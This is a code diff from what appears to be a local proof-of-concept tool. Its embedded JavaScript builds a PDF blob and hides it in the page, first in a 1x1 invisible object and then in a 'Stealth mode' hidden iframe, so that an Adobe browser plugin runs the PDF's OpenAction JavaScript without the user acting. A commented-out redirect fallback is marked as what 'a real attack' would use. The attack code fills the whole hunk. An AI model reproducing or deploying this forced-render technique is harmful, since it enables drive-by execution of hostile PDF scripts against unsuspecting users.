@@ -59,30 +59,17 @@ def create_local_poc():
 
                 log("Stage 2: PDF Blob created at " + pdfUrl);
 
-                // Technique A: Object/Embed Injection (Forced Inline Rendering)
-                // We use an <object> tag instead of just an iframe.
-                // This is more aggressive at forcing the browser to load the plugin.
-                log("Attempting 'Auto-Open' via <object> Injection...");
+                // Technique A: Iframe Injection (The "Auto-Open" Vector)
+                // Instead of downloading, we force the browser to RENDER the PDF immediately.
+                // If the Adobe Plugin is present, it will execute the 'OpenAction' JS inside the PDF.
+                log("Attempting 'Auto-Open' via Iframe Injection...");
 
-                const obj = document.createElement('object');
-                obj.data = pdfUrl;
-                obj.type = "application/pdf";
-                obj.width = "1";
-                obj.height = "1";
-                obj.style.visibility = "hidden";
-                document.body.appendChild(obj);
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none'; // Stealth mode
+                iframe.src = pdfUrl;
+                document.body.appendChild(iframe);
 
-                log("Stage 3: Object injected. Waiting for plugin execution...");
-
-                // Technique B: Window Navigation (The "Direct Open" Vector)
-                // If the object tag fails (e.g., built-in viewer blocks it),
-                // we try to navigate the current window to the PDF blob.
-                // This forces the browser to decide: "Render or Download?"
-                setTimeout(() => {
-                    log("Attempting fallback navigation (window.location)...");
-                    // window.location.href = pdfUrl; // Uncomment to force navigation
-                    log("Navigation skipped to keep page open. In a real attack, we would redirect.");
-                }, 500);
+                log("Stage 3: Iframe injected. If Adobe Plugin is active, JS will execute now.");
 
                 // Technique B: Fallback Download (for MotW evidence)
                 // We also trigger the download so you have the file for the PowerShell check.
